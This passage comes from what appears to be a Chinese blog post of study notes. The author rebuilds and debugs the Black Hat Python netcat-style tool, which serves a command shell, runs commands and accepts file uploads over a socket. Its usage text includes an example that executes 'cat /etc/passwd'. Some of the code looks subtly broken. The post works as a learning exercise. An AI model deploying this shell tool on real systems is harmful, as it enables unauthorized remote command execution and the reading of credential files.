class="line">     client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="comment">#连接到目标主机</span></span><br><span class="line">         client.connect((target,port))</span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(buffer):</span><br><span class="line">             client.send(buffer)</span><br><span class="line">             </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">             <span class="comment">#等待数据回传</span></span><br><span class="line">             recv_len=<span class="number">1</span></span><br><span class="line">             response=<span class="string">&quot;&quot;</span></span><br><span class="line">             </span><br><span class="line">             <span class="keyword">while</span> recv_len:</span><br><span class="line">                 </span><br><span class="line">                 data=client.recv(<span class="number">4096</span>)</span><br><span class="line">                 recv_len=<span class="built_in">len</span>(data)</span><br><span class="line">                 response+=data</span><br><span class="line">                 </span><br><span class="line">                 <span class="keyword">if</span> recv_len&lt;<span class="number">4096</span>:</span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">             <span class="built_in">print</span>(response)</span><br><span class="line">             </span><br><span class="line">             <span class="comment">#等待更多输入</span></span><br><span class="line">             buffer=raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">             buffer+=<span class="string">&quot;\n&quot;</span></span><br><span class="line">             </span><br><span class="line">             <span class="comment">#发送出去</span></span><br><span class="line">             client.send(buffer)</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;[*] Exception! Exiting.&quot;</span>)</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#关闭连接</span></span><br><span class="line">         client.close()</span><br></pre></td></tr></table></figure>

<p>监听，然后运行命令，这些执行的命令，都被存储到output变量中了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>():</span><br><span class="line">         <span class="keyword">global</span> target</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#若无目标，监听所有接口</span></span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">             target=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">         server =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">         server.bind((target,port))</span><br><span class="line">         </span><br><span class="line">         server.listen(<span class="number">5</span>)</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">             client_socket,addr=server.accept()</span><br><span class="line">             </span><br><span class="line">             <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">             client_thread=threading.Thread(target=client_handler,</span><br><span class="line">             args=(client_socket,))</span><br><span class="line">             client_thread.start()</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command</span>):</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#换行</span></span><br><span class="line">         command=command.rstrip()</span><br><span class="line">         <span class="comment">#运行命令并将输出返回</span></span><br><span class="line">         </span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">             output=subprocess.check_output(command,stderr=subprocess.</span><br><span class="line">                                            STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">         <span class="keyword">except</span>:</span><br><span class="line">             output=(<span class="string">&quot;Failed to execute command.\r\n&quot;</span>)</span><br><span class="line">         <span class="comment">#发送输出</span></span><br><span class="line">         <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>文件上传、命令执行和shell相关功能</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">client_handler</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(upload_des):</span><br><span class="line">        <span class="comment">#读取所有字符并写下目标</span></span><br><span class="line">        file_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#持续读取直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer+=data</span><br><span class="line">        <span class="comment">#接收数据并写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor=<span class="built_in">open</span>(upload_des,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#检查文件是否写出来了</span></span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="string">b&quot;Successfully saved file to %s\r\b&quot;</span> % upload_des)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">b&quot;Failed to save file to %s\r\b&quot;</span> % upload_des)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检查命令执行</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(execute):</span><br><span class="line">        <span class="comment">#运行命令</span></span><br><span class="line">        output=run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#命令行shell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#弹出窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b&quot;&lt;BHP:#&gt;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#现在接收文件，直到发现换行符</span></span><br><span class="line">       		cmd_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">       		<span class="keyword">while</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                </span><br><span class="line">            	cmd_buffer+=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#返还命令输出</span></span><br><span class="line">            response=run_command(cmd_buffer)</span><br><span class="line">            <span class="comment">#返回响应数据</span></span><br><span class="line">            client_socket.send(response)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>windows下：</p>
<p>服务器端cd到文件所在目录:python netcat.py -l -p 5555 -c</p>
<p>客户端cd到文件所在目录:python netcat.py -t localhost -p 5555</p>
<p>然后输入信息，观察服务器端情况</p>
<p>客户端输入dir回车时，服务端出现：</p>
</blockquote>
<blockquote>
<p>Exception in thread Thread-12:<br>Traceback (most recent call last):</p>
<p>…  target(*self._args, **self._kwargs)<br>  File “netcat.py”, line 203, in client_handler<br>    cmd_buffer+&#x3D;client_socket.recv(1024)<br>ConnectionAbortedError: [WinError 10053] 你的主机中的软件中止了一个已建立的连接。</p>
</blockquote>
<blockquote>
<p>客户端提示是触发了client_sender里的except，将原except改一下：</p>
<p>发现原因：</p>
<p>dir<br>[*] Exception: a bytes-like object is required, not ‘str’</p>
</blockquote>
<blockquote>
<p> 将client_sender()处的clent.send改为：</p>
<p>  client.send(buffer.encode()) &#x2F;&#x2F;创建一个字节类型的对象并将其发送给服务器。</p>
</blockquote>
<blockquote>
<p>但是：</p>
<p>[*] Exception: can only concatenate str (not “bytes”) to str</p>
</blockquote>
<blockquote>
<pre><code>      print(response.decode())
    #等待更多输入
     #buffer=raw_input(&quot;&quot;)
     buffer=input(&quot;&quot;)
     buffer+=&quot;\n&quot;
                
     #发送出去
     client.send(buffer.encode())
     
     
     ....
                     
      while b&quot;\n&quot; not in cmd_buffer:
</code></pre>
<p>  <strong>.send()和.recv()函数要的是字节型字符串，注意不要把字节型字符串与普通字符拼接。</strong></p>
</blockquote>
<blockquote>
<p>之后出现</p>
<p> Exception: ‘utf-8’ codec can’t decode byte 0xc7 in position 1: invalid continuation byte</p>
<p>考虑在windows环境下执行，需要import chardet，编码为gbk</p>
</blockquote>
<h3 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">e:\Wing Personal 9&gt;python netcat.py -t localhost -p 5555</span><br><span class="line">^Z</span><br><span class="line">&lt;BHP:#&gt;</span><br><span class="line">input:</span><br><span class="line">dir</span><br><span class="line"> 驱动器 E 中的卷是 E</span><br><span class="line"> 卷的序列号是 28FF-7164</span><br><span class="line"></span><br><span class="line"> e:\Wing Personal 9 的目录</span><br><span class="line"></span><br><span class="line">2023/05/20  18:34    &lt;DIR&gt;          .</span><br><span class="line">2023/05/20  18:34    &lt;DIR&gt;          ..</span><br><span class="line">2023/05/13  20:18    &lt;DIR&gt;          bin</span><br><span class="line">2023/05/03  20:20    &lt;DIR&gt;          bootstrap</span><br><span class="line">2023/05/13  20:19    &lt;DIR&gt;          build-files</span><br><span class="line">2023/05/17  18:49         1,272,872 CATALOG.txt</span><br></pre></td></tr></table></figure>

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment">#Python解释器和运行时环境交互</span></span><br><span class="line"><span class="keyword">import</span> socket <span class="comment">#客户端与服务端连接</span></span><br><span class="line"><span class="keyword">import</span> getopt <span class="comment">#命令行选项解析模块</span></span><br><span class="line"><span class="keyword">import</span> threading <span class="comment">#多线程编程,并发执行、异步操作和线程间的协调与通信等</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment">#用于创建和管理子进程的模块,执行外部命令、调用其他可执行文件，并与其进行交互和处理。</span></span><br><span class="line"><span class="keyword">import</span> chardet <span class="comment">#编码问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#全局变量</span></span><br><span class="line">listen =<span class="literal">False</span></span><br><span class="line">command=<span class="literal">False</span></span><br><span class="line">upload =<span class="literal">False</span></span><br><span class="line">upload_des=<span class="string">&quot;&quot;</span></span><br><span class="line">execute=<span class="string">&quot;&quot;</span></span><br><span class="line">target =<span class="string">&quot;&quot;</span></span><br><span class="line">port   =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: netcat.py -t target_host -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen          -listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-e  --execute=file_to_run -execute the given file upon receiving a connection&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command     -initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload_des  -upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ep:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;netcat.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;abcd&#x27; | ./netcat.py -t 192.168.0.1 -p 5555&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_des</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#2.读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts,args=getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&quot;hle:t:p:cu:&quot;</span>,</span><br><span class="line">                                [<span class="string">&quot;help&quot;</span>,<span class="string">&quot;listen&quot;</span>,<span class="string">&quot;execute&quot;</span>,<span class="string">&quot;target&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;command&quot;</span>,<span class="string">&quot;upload&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;--listen&quot;</span>):</span><br><span class="line">            listen=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;--excute&quot;</span>):</span><br><span class="line">            execute = a         </span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;--command&quot;</span>):</span><br><span class="line">            command=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_des=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;--target&quot;</span>):</span><br><span class="line">            target=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;--port&quot;</span>):</span><br><span class="line">            port=<span class="built_in">int</span>(a)</span><br><span class="line">          </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">&quot;input wrong!&quot;</span></span><br><span class="line">    <span class="comment">#3.监听或 仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt;<span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment">#阻塞，不向标准输入发送数据时，linux发送ctrl -d,windows ctrl z</span></span><br><span class="line">        buffer =sys.stdin.read()</span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#4.监听并上传文件、执行命令</span></span><br><span class="line">    <span class="comment">#放置一个反弹shell</span></span><br><span class="line">    <span class="comment">#取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">client_sender</span>(<span class="params">buffer</span>):</span><br><span class="line">    <span class="comment">#这个函数里要特别注意杜绝字节型字符串和普通字符串的拼接问题</span></span><br><span class="line">    <span class="comment">#且，网络发送的都是字节型字符串，注意编码解码</span></span><br><span class="line">    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#连接到目标主机</span></span><br><span class="line">        client.connect((target,port))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buffer):</span><br><span class="line">            <span class="comment">#client.send(buffer)</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))<span class="comment">#windows是默认gdk编码</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#等待数据回传</span></span><br><span class="line">            recv_len=<span class="number">1</span></span><br><span class="line">            response=<span class="string">&quot;&quot;</span></span><br><span class="line">          </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> recv_len:</span><br><span class="line">                </span><br><span class="line">                data=client.recv(<span class="number">4096</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#</span></span><br><span class="line">                recv_len=<span class="built_in">len</span>(data)</span><br><span class="line">                response+=data </span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> recv_len&lt;<span class="number">4096</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#等待更多输入</span></span><br><span class="line">            <span class="comment">#buffer=raw_input(&quot;&quot;)#python2用法</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">            buffer=<span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            buffer+=<span class="string">&quot;\n&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">#发送数据</span></span><br><span class="line">            client.send(buffer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment">#print(&quot;[*] Exception! Exiting.&quot;)</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*111] Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#关闭连接</span></span><br><span class="line">        client.close()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>():</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#若无目标，监听所有接口</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">        target=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">        </span><br><span class="line">    server =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target,port))</span><br><span class="line">    </span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket,addr=server.accept()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">        client_thread=threading.Thread(target=client_handler,</span><br><span class="line">        args=(client_socket,))</span><br><span class="line">        </span><br><span class="line">        client_thread.start()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command</span>):</span><br><span class="line">            </span><br><span class="line">    <span class="comment">#处理空格和换行</span></span><br><span class="line">    command=command.rstrip()</span><br><span class="line">    <span class="comment">#运行命令并将输出返回</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        command=command.decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#先解码再执行</span></span><br><span class="line">        <span class="comment">#运行命令并返回输出</span></span><br><span class="line">        output=subprocess.check_output(command,stderr=subprocess.</span><br><span class="line">                                       STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment">#返回结果为系统shell默认编码的形式</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        </span><br><span class="line">        output = <span class="string">b&quot;Failed to execute command. Error: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="comment">#发送输出</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">client_handler</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(upload_des):</span><br><span class="line">        <span class="comment">#读取所有字符并写下目标</span></span><br><span class="line">        file_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#持续读取直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer+=data</span><br><span class="line">        <span class="comment">#接收数据并写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#file_descriptor=open(upload_des,&quot;wb&quot;)</span></span><br><span class="line">            <span class="comment">#file_descriptor.write(file_buffer)</span></span><br><span class="line">            <span class="comment">#file_descriptor.close()</span></span><br><span class="line">            <span class="keyword">with</span> <span 